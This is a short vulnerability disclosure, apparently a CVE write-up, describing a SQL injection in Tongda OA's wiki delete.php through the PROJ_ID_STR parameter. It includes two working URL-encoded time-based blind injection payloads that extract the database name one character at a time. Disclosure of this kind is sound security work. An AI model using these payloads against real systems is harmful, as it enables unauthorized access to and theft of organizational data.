SQL injection vulnerability exists in Tongda OA

version:Versions below v11.10 and v2017

Route: general/wiki/cp/ct/delete.php

There is an injected parameter: $PROJ_ID_STR

The code here is very concise. When $PROJ_ID_STR is not empty, the parameters are directly spliced ​​into the SQL statement. Since the brackets are closed here, there is a bypass.

![image](https://github.com/YXuanZ1216/cve/assets/150583404/87558cb1-636f-45b9-819c-0e7a782a0d35)

We can use Cartesian product blind injection for injection. The following payload can determine that the first character of the database name is t, because it was successfully delayed at 116. The ASCII code 116 also corresponds to the lowercase letter t. By analogy, the database name and any information about the database can be obtained through blind injection.
POC
```
1)%20and%20(substr(DATABASE(),1,1))=char(116)%20and%20(select%20count(*)%20from%20information_schema.columns%20A,information_schema.columns%20B)%20and(1)=(1
```
![image](https://github.com/YXuanZ1216/cve/assets/150583404/1dc58caf-eac7-4be7-afb6-04f1a64b88d1)

Intercept the second digit of the database through blind injection, and determine the second digit as the letter d through the delay time
POC
```
1)%20and%20(substr(DATABASE(),2,1))=char(100)%20and%20(select%20count(*)%20from%20information_schema.columns%20A,information_schema.columns%20B)% 20and(1)=(1
```
By analogy, the database name is obtained through blind injection: td_oa
